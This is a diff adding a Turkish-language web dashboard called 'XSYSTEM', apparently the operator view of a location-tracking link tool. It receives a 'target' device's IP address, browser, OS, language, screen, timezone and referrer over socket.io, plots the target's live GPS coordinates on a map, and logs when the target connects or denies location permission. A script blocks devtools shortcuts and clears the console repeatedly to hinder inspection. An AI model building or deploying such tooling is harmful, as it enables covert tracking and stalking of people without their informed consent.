@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSYSTEM | DASHBOARD</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+:root{
+  --p:#9B30FF;--p2:#c084fc;--p3:#6a1b9a;--pk:#e879f9;
+  --cy:#22d3ee;--gd:#FFD700;--bg:#04010f;
+  --card:rgba(14,7,35,0.85);--border:rgba(155,48,255,0.2);
+  --text:#ede9ff;--muted:#6b5a8e;--red:#ff4466;--green:#4ade80;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+::-webkit-scrollbar{width:3px;}
+::-webkit-scrollbar-thumb{background:var(--p3);border-radius:2px;}
+body{background:var(--bg);font-family:'Rajdhani',sans-serif;min-height:100vh;color:var(--text);overflow-x:hidden;}
+.bg-grid{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background-image:linear-gradient(rgba(155,48,255,0.07)1px,transparent 1px),linear-gradient(90deg,rgba(155,48,255,0.07)1px,transparent 1px);
+  background-size:44px 44px;animation:gridScroll 25s linear infinite;}
+@keyframes gridScroll{to{background-position:0 44px;}}
+.bg-blobs{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse 65% 55% at 10% 15%,rgba(120,40,220,0.2)0%,transparent 60%),
+  radial-gradient(ellipse 45% 40% at 90% 80%,rgba(200,60,255,0.1)0%,transparent 55%);}
+
+.wrap{position:relative;z-index:1;max-width:620px;margin:0 auto;padding:40px 16px 60px;}
+
+/* HEADER */
+.header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
+.h-left{display:flex;align-items:center;gap:14px;}
+.h-logo{width:46px;height:46px;border-radius:50%;background:rgba(155,48,255,0.15);
+  border:1px solid rgba(155,48,255,0.4);display:flex;align-items:center;justify-content:center;
+  font-size:20px;box-shadow:0 0 20px rgba(155,48,255,0.3);}
+.h-title{font-family:'Orbitron',monospace;font-size:16px;font-weight:900;letter-spacing:4px;
+  background:linear-gradient(135deg,#c084fc,#9B30FF,#22d3ee);
+  -webkit-background-clip:text;background-clip:text;color:transparent;}
+.h-sub{font-size:9px;letter-spacing:3px;color:var(--muted);}
+.status-pill{display:flex;align-items:center;gap:8px;padding:8px 16px;border-radius:50px;
+  font-family:'Orbitron',monospace;font-size:10px;letter-spacing:2px;
+  border:1px solid rgba(155,48,255,0.25);background:rgba(155,48,255,0.08);}
+.status-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);}
+.status-dot.waiting{background:var(--gd);box-shadow:0 0 8px var(--gd);animation:blink 1.5s ease infinite;}
+.status-dot.active{background:var(--green);box-shadow:0 0 8px var(--green);}
+.status-dot.offline{background:var(--red);box-shadow:0 0 8px var(--red);}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+
+/* TIMER BAR */
+.timer-bar{display:flex;align-items:center;gap:12px;padding:12px 18px;
+  background:rgba(255,68,102,0.06);border:1px solid rgba(255,68,102,0.2);
+  border-radius:14px;margin-bottom:14px;font-family:'Orbitron',monospace;font-size:11px;}
+.timer-label{color:var(--muted);letter-spacing:2px;}
+.timer-val{color:var(--red);font-size:14px;font-weight:700;margin-left:auto;}
+
+/* PANEL */
+.panel{background:var(--card);border:1px solid var(--border);border-radius:20px;
+  padding:22px 20px;margin-bottom:12px;backdrop-filter:blur(20px);
+  position:relative;overflow:hidden;animation:rise 0.5s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(18px);}to{opacity:1;transform:translateY(0);}}
+.panel::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,rgba(155,48,255,0.6),transparent);}
+.panel-title{font-family:'Orbitron',monospace;font-size:9px;letter-spacing:5px;color:var(--p);
+  margin-bottom:16px;display:flex;align-items:center;gap:10px;}
+.panel-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(155,48,255,0.4),transparent);}
+
+/* WAITING STATE */
+.waiting-state{text-align:center;padding:30px;display:none;}
+.waiting-state.visible{display:block;}
+.ws-ring{width:60px;height:60px;border:2px solid rgba(155,48,255,0.15);
+  border-top-color:var(--p);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 14px;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.ws-text{font-family:'Orbitron',monospace;font-size:10px;letter-spacing:3px;color:var(--muted);}
+
+/* INFO GRID */
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;display:none;}
+.info-grid.visible{display:grid;}
+.info-cell{background:rgba(155,48,255,0.05);border:1px solid rgba(155,48,255,0.12);
+  border-radius:12px;padding:12px 14px;}
+.info-lbl{font-size:8px;letter-spacing:3px;color:var(--muted);margin-bottom:5px;}
+.info-val{font-family:'Orbitron',monospace;font-size:11px;color:var(--p2);word-break:break-all;}
+.info-val.highlight{color:var(--cy);}
+.info-val.ip{color:var(--gd);}
+
+/* MAP */
+#map{height:280px;border-radius:14px;overflow:hidden;border:1px solid rgba(155,48,255,0.25);
+  display:none;margin-top:8px;}
+#map.visible{display:block;}
+.map-placeholder{height:140px;display:flex;align-items:center;justify-content:center;
+  flex-direction:column;gap:10px;color:var(--muted);font-size:11px;letter-spacing:2px;}
+.map-placeholder-ico{font-size:32px;opacity:0.4;}
+
+/* COORDS */
+.coords-row{display:none;gap:8px;margin-top:8px;}
+.coords-row.visible{display:flex;}
+.coord-cell{flex:1;background:rgba(34,211,238,0.05);border:1px solid rgba(34,211,238,0.15);
+  border-radius:10px;padding:10px 12px;text-align:center;}
+.coord-lbl{font-size:8px;letter-spacing:2px;color:var(--muted);margin-bottom:4px;}
+.coord-val{font-family:'Orbitron',monospace;font-size:11px;color:var(--cy);}
+
+/* LOGS */
+.log-area{background:rgba(0,0,0,0.6);border:1px solid rgba(155,48,255,0.12);
+  border-radius:12px;padding:14px;max-height:200px;overflow-y:auto;
+  font-family:'Orbitron',monospace;font-size:9px;}
+.log-entry{padding:4px 0;display:flex;gap:10px;border-bottom:1px solid rgba(155,48,255,0.05);}
+.le-time{color:var(--muted);flex-shrink:0;font-size:8px;}
+.le-msg.ok{color:var(--green);}
+.le-msg.warn{color:var(--gd);}
+.le-msg.err{color:var(--red);}
+.le-msg.info{color:var(--cy);}
+.le-msg.sys{color:var(--p2);}
+
+/* DENIED */
+.denied-banner{display:none;padding:16px;background:rgba(255,68,102,0.08);
+  border:1px solid rgba(255,68,102,0.25);border-radius:12px;text-align:center;
+  font-family:'Orbitron',monospace;font-size:10px;color:var(--red);letter-spacing:2px;margin-top:10px;}
+.denied-banner.visible{display:block;}
+
+/* FOOTER */
+.footer-bar{text-align:center;margin-top:18px;font-size:9px;letter-spacing:2px;color:rgba(107,90,142,0.35);}
+
+/* Leaflet dark overrides */
+.leaflet-container{background:#0a0520!important;}
+.leaflet-tile{filter:hue-rotate(245deg) saturate(0.4) brightness(0.4) invert(0)!important;}
+</style>
+<script>(function(){
+  document.addEventListener('contextmenu',e=>e.preventDefault());
+  document.addEventListener('keydown',e=>{
+    if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key))||(e.ctrlKey&&e.key==='u'))e.preventDefault();
+  });
+  setInterval(()=>console.clear(),100);
+})();</script>
+</head>
+<body>
+<div class="bg-grid"></div>
+<div class="bg-blobs"></div>
+
+<div class="wrap">
+  <!-- HEADER -->
+  <div class="header">
+    <div class="h-left">
+      <div class="h-logo">📡</div>
+      <div>
+        <div class="h-title">XSYSTEM</div>
+        <div class="h-sub">CANLI DASHBOARD</div>
+      </div>
+    </div>
+    <div class="status-pill">
+      <div class="status-dot waiting" id="statusDot"></div>
+      <span id="statusText">BEKLENIYOR</span>
+    </div>
+  </div>
+
+  <!-- TIMER -->
+  <div class="timer-bar">
+    <span class="timer-label">⏱ OTURUM KALAN:</span>
+    <span class="timer-val" id="timerVal">15:00</span>
+  </div>
+
+  <!-- CİHAZ BİLGİLERİ PANELİ -->
+  <div class="panel">
+    <div class="panel-title">CİHAZ BİLGİLERİ</div>
+    <div class="waiting-state visible" id="deviceWaiting">
+      <div class="ws-ring"></div>
+      <div class="ws-text">HEDEF BAĞLANTISI BEKLENİYOR</div>
+    </div>
+    <div class="info-grid" id="infoGrid">
+      <div class="info-cell"><div class="info-lbl">IP ADRESİ</div><div class="info-val ip" id="dIP">—</div></div>
+      <div class="info-cell"><div class="info-lbl">TARAYICI</div><div class="info-val" id="dBrowser">—</div></div>
+      <div class="info-cell"><div class="info-lbl">İŞLETİM SİSTEMİ</div><div class="info-val" id="dOS">—</div></div>
+      <div class="info-cell"><div class="info-lbl">CİHAZ TÜRÜ</div><div class="info-val" id="dDevice">—</div></div>
+      <div class="info-cell"><div class="info-lbl">DİL</div><div class="info-val highlight" id="dLang">—</div></div>
+      <div class="info-cell"><div class="info-lbl">EKRAN</div><div class="info-val highlight" id="dScreen">—</div></div>
+      <div class="info-cell"><div class="info-lbl">ZAMAN DİLİMİ</div><div class="info-val" id="dTZ">—</div></div>
+      <div class="info-cell"><div class="info-lbl">REFERRER</div><div class="info-val" id="dRef">—</div></div>
+    </div>
+  </div>
+
+  <!-- KONUM PANELİ -->
+  <div class="panel">
+    <div class="panel-title">CANLI KONUM</div>
+    <div class="map-placeholder" id="mapPlaceholder">
+      <div class="map-placeholder-ico">🗺️</div>
+      <div>KONUM VERİSİ BEKLENİYOR</div>
+    </div>
+    <div id="map"></div>
+    <div class="coords-row" id="coordsRow">
+      <div class="coord-cell"><div class="coord-lbl">ENLEM</div><div class="coord-val" id="cLat">—</div></div>
+      <div class="coord-cell"><div class="coord-lbl">BOYLAM</div><div class="coord-val" id="cLng">—</div></div>
+      <div class="coord-cell"><div class="coord-lbl">DOĞRULUK</div><div class="coord-val" id="cAcc">—</div></div>
+    </div>
+    <div class="denied-banner" id="deniedBanner">⛔ KONUM İZNİ REDDEDİLDİ</div>
+  </div>
+
+  <!-- LOG PANELİ -->
+  <div class="panel">
+    <div class="panel-title">SİSTEM LOGLARI</div>
+    <div class="log-area" id="logArea"></div>
+  </div>
+
+  <div class="footer-bar">XSYSTEM DASHBOARD · © 2026 · SESSION: <span id="sessionIdDisplay">—</span></div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+const SESSION_ID = window.location.pathname.split('/')[2];
+document.getElementById('sessionIdDisplay').textContent = SESSION_ID;
+
+const socket = io();
+let map = null, marker = null;
+let expiresAt = null;
+let timerInt = null;
+
+function log(msg, type='info'){
+  const a = document.getElementById('logArea');
+  const now = new Date();
+  const t = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}`;
+  const el = document.createElement('div');
+  el.className = 'log-entry';
+  el.innerHTML = `<span class="le-time">${t}</span><span class="le-msg ${type}">${msg}</span>`;
+  a.appendChild(el);
+  a.scrollTop = a.scrollHeight;
+}
+
+function setStatus(state, label){
+  const dot = document.getElementById('statusDot');
+  const txt = document.getElementById('statusText');
+  dot.className = `status-dot ${state}`;
+  txt.textContent = label;
+}
+
+function startTimer(exp){
+  clearInterval(timerInt);
+  expiresAt = exp;
+  timerInt = setInterval(()=>{
+    const left = Math.max(0,Math.floor((expiresAt - Date.now())/1000));
+    const m = String(Math.floor(left/60)).padStart(2,'0');
+    const s = String(left%60).padStart(2,'0');
+    document.getElementById('timerVal').textContent = `${m}:${s}`;
+    if(left===0){ clearInterval(timerInt); log('⛔ Oturum süresi doldu.','err'); setStatus('offline','SÜRE DOLDU'); }
+  },1000);
+}
+
+function initMap(lat, lng){
+  if(map){ map.setView([lat,lng],15); return; }
+  document.getElementById('mapPlaceholder').style.display='none';
+  document.getElementById('map').classList.add('visible');
+  map = L.map('map',{zoomControl:true,scrollWheelZoom:true}).setView([lat,lng],15);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+    attribution:'© OpenStreetMap',maxZoom:19
+  }).addTo(map);
+
+  // Özel mor marker
+  const icon = L.divIcon({
+    html:`<div style="width:20px;height:20px;background:radial-gradient(circle,#e879f9,#9B30FF);
+      border-radius:50%;border:2px solid #fff;box-shadow:0 0 15px rgba(155,48,255,0.8),0 0 30px rgba(155,48,255,0.4);
+      animation:pulse 2s ease infinite;"></div>
+    <style>@keyframes pulse{0%,100%{transform:scale(1);opacity:1;}50%{transform:scale(1.3);opacity:0.7;}}</style>`,
+    className:'',iconAnchor:[10,10]
+  });
+  marker = L.marker([lat,lng],{icon}).addTo(map);
+  marker.bindPopup(`<b style="color:#9B30FF">HEDEF KONUMU</b><br><small>${lat.toFixed(5)}, ${lng.toFixed(5)}</small>`).openPopup();
+}
+
+function updateCoords(coords){
+  document.getElementById('cLat').textContent = coords.latitude.toFixed(6);
+  document.getElementById('cLng').textContent = coords.longitude.toFixed(6);
+  document.getElementById('cAcc').textContent = coords.accuracy ? `~${Math.round(coords.accuracy)}m` : '—';
+  document.getElementById('coordsRow').classList.add('visible');
+  initMap(coords.latitude, coords.longitude);
+  if(marker) marker.setLatLng([coords.latitude, coords.longitude]);
+}
+
+// ── Socket olayları ──
+socket.on('connect',()=>{
+  log('✓ Dashboard bağlantısı kuruldu.','ok');
+  socket.emit('watch', SESSION_ID);
+});
+
+socket.on('session_info',(session)=>{
+  log(`📋 Oturum bilgisi alındı → ${session.sessionId}`,'sys');
+  startTimer(session.expiresAt);
+  if(session.target){
+    showDevice(session.target);
+    if(session.target.coords) updateCoords(session.target.coords);
+  }
+});
+
+socket.on('target_arrived',(target)=>{
+  log('🎯 HEDEF BAĞLANDI!','warn');
+  setStatus('active','CANLI');
+  showDevice(target);
+  log(`🌐 IP: ${target.ip||'Alınamadı'}`,'ok');
+  log(`💻 Cihaz: ${target.device} / ${target.os} / ${target.browser}`,'ok');
+});
+
+socket.on('location_update',(coords)=>{
+  log(`📍 Konum güncellendi → ${coords.latitude.toFixed(5)}, ${coords.longitude.toFixed(5)}`,'ok');
+  updateCoords(coords);
+});
+
+socket.on('location_denied',()=>{
+  log('⛔ Hedef konum iznini reddetti.','err');
+  document.getElementById('deniedBanner').classList.add('visible');
+});
+
+socket.on('target_disconnected',()=>{
+  log('⚠ Hedef bağlantısı kesildi.','warn');
+  setStatus('waiting','BAĞLANTI KESİLDİ');
+});
+
+socket.on('session_expired',()=>{
+  log('⛔ Oturum süresi doldu veya bulunamadı.','err');
+  setStatus('offline','OTURUM YOK');
+});
+
+function showDevice(target){
+  document.getElementById('deviceWaiting').classList.remove('visible');
+  document.getElementById('infoGrid').classList.add('visible');
+  document.getElementById('dIP').textContent = target.ip || '—';
+  document.getElementById('dBrowser').textContent = target.browser || '—';
+  document.getElementById('dOS').textContent = target.os || '—';
+  document.getElementById('dDevice').textContent = target.device || '—';
+  document.getElementById('dLang').textContent = target.language || '—';
+  document.getElementById('dScreen').textContent = target.screen || '—';
+  document.getElementById('dTZ').textContent = target.timezone || '—';
+  document.getElementById('dRef').textContent = target.referrer || '—';
+}
+
+log('// XSYSTEM Dashboard başlatılıyor...','sys');
+log(`// Oturum ID: ${SESSION_ID}`,'sys');
+</script>
+</body>
+</html>
